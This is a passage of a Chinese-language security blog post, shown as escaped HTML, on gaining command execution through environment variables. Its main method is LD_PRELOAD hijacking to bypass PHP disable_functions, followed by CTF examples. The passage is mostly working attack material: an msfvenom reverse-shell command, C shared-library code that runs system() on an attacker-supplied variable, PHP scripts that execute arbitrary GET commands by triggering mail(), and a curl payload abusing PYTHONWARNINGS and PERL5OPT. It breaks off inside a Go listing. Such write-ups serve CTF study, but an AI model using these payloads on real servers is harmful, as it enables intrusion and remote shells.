&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -fPIC -shared evil.c -o evil.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp &lt;span style="color:#111">lhost&lt;/span>&lt;span style="color:#f92672">=&lt;/span>192.168.31.29 &lt;span style="color:#111">lport&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8426&lt;/span> -f elf-so -o evil.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>加载恶意.so文件来劫持任意函数，常出现于bypass disable_functions和打redis中&lt;/p>
&lt;p>当web服务提供了自定义环境变量的接口，也可以用它来rce&lt;/p>
&lt;h3 id="bypass-disable_functions">bypass disable_functions&lt;/h3>
&lt;p>&lt;a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/">浅谈几种Bypass disable_functions的方法&lt;/a>&lt;/p>
&lt;h4 id="getuid">getuid&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">geteuid&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">cmdline&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;EVIL_CMDLINE&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">unsetenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmdline&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -fPIC test.c -o test.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt; &amp;lt;b&amp;gt;example&amp;lt;/b&amp;gt;: http://test.com/exp.php?cmd=pwd&amp;amp;outpath=/tmp/xx&amp;amp;sopath=/var/www/html/exp.so &amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$out_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;outpath&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$evil_cmdline&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; &amp;gt; &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$out_path&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; 2&amp;gt;&amp;amp;1&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt; &amp;lt;b&amp;gt;cmdline&amp;lt;/b&amp;gt;: &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$evil_cmdline&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">putenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;EVIL_CMDLINE=&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$evil_cmdline&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$so_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;sopath&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">putenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;LD_PRELOAD=&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$so_path&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mail&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt; &amp;lt;b&amp;gt;output&amp;lt;/b&amp;gt;: &amp;lt;br /&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">nl2br&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out_path&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out_path&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>url/test.php?cmd=pwd&amp;amp;outpath=/tmp/xx&amp;amp;sopath=/var/www/html/test.so
&lt;/code>&lt;/pre>&lt;p>原理是利用&lt;code>mail&lt;/code>触发&lt;code>sendmail&lt;/code>，再触发&lt;code>getuid&lt;/code>（已被我们的.so劫持），最后执行命令&lt;/p>
&lt;h4 id="preload">preload&lt;/h4>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">extern&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">**&lt;/span> &lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">__attribute__&lt;/span> &lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">__constructor__&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#111">preload&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// get command line options and arg
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">cmdline&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;EVIL_CMDLINE&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// unset environment variable LD_PRELOAD.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// unsetenv(&amp;#34;LD_PRELOAD&amp;#34;) no effect on some
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// distribution (e.g., centos), I need crafty trick.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">strstr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#d88200">&amp;#34;LD_PRELOAD&amp;#34;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">environ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">][&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;\0&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// executive command
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmdline&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt; &amp;lt;b&amp;gt;example&amp;lt;/b&amp;gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;amp;outpath=/tmp/xx&amp;amp;sopath=/var/www/bypass_disablefunc_x64.so &amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;cmd&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$out_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;outpath&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$evil_cmdline&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; &amp;gt; &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$out_path&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34; 2&amp;gt;&amp;amp;1&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt; &amp;lt;b&amp;gt;cmdline&amp;lt;/b&amp;gt;: &amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$evil_cmdline&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">putenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;EVIL_CMDLINE=&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$evil_cmdline&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$so_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;sopath&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">putenv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;LD_PRELOAD=&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$so_path&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">mail&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt; &amp;lt;b&amp;gt;output&amp;lt;/b&amp;gt;: &amp;lt;br /&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#75af00">nl2br&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out_path&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">unlink&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$out_path&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>url/test.php?cmd=pwd&amp;amp;outpath=/tmp/xx&amp;amp;sopath=/var/www/html/test.so
&lt;/code>&lt;/pre>&lt;p>这个属于格局打开，不局限于劫持某个函数，而是通过preload拦截启动进程&lt;/p>
&lt;h2 id="in-ctf">in CTF&lt;/h2>
&lt;h3 id="plaidctf-2021">[PlaidCTF 2021]&lt;/h3>
&lt;p>&lt;a href="https://luker983.github.io/blog/2021-04-26-Embedded-Webserver-Null-Byte-Injection/">wp&lt;/a>&lt;/p>
&lt;h3 id="pbctf-2021advancement">[pbCTF 2021]Advancement&lt;/h3>
&lt;p>&lt;a href="https://articles.zsxq.com/id_xipxbpei4eti.html">wp&lt;/a> | &lt;a href="https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/">wp2&lt;/a> | &lt;a href="https://www.elttam.com/blog/env/">HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters&lt;/a>&lt;/p>
&lt;p>是GoAhead框架，在route.txt中增加cgi路由&lt;/p>
&lt;pre tabindex="0">&lt;code>route uri=/cgi-bin handler=cgi
route uri=/ redirect=/cgi-bin/date handler=redirect
&lt;/code>&lt;/pre>&lt;p>以及/cgi-bin下的cgi脚本&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">datetime&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">date&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Content-Type: text/plain&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">today&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">date&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">today&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Today&amp;#39;s date:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">today&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>而由GoAhead的cve我们知道（但好像这个题在当时是day题 没有公开的cve-2021-42342 而这里用的就是这个），上传表单键值对可以写入环境变量中，我们选择在PYTHONWARNINGS环境变量引入其它模块，再通过antigravity模块对于browser环境变量启动响应的进程，配合perl+PERL5OPT环境变量进行rce（更多内容参见上面的文章&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ curl -F &lt;span style="color:#d88200">&amp;#34;PYTHONWARNINGS=all:0:antigravity.x:0:0&amp;#34;&lt;/span> -F &lt;span style="color:#d88200">&amp;#34;BROWSER=perlthanks&amp;#34;&lt;/span> -F &lt;span style="color:#d88200">&amp;#39;PERL5OPT=-Mbase;print(system(&amp;#34;cat&amp;#34;.chr(0x20).&amp;#34;/flag&amp;#34;));exit;&amp;#39;&lt;/span> http://advancement.chal.perfect.blue
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>————p牛在vulhub中给出的poc用的是LD_PRELOAD，但是由于这个题目的相关目录/etc/goahead/tmp是只读的，所以无法构造上传表单传.so&lt;/p>
&lt;h3 id="湖湘杯2021-线下multistageagency">[湖湘杯2021 线下]MultistageAgency&lt;/h3>
&lt;p>&lt;a href="https://ha1c9on.top/?p=1913">wp1&lt;/a> | &lt;a href="https://guokeya.github.io/post/ZqfbSBz7J/">wp2&lt;/a>&lt;/p>
&lt;p>有proxy和web两个web用户起的服务，server由root起&lt;/p>
&lt;p>proxy在内网的8080端口，主要提供返回&lt;code>Secretkey&lt;/code>的功能&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;github.com/elazarl/goproxy&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;io/ioutil&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;net/http&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;os&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">)&lt;/span>
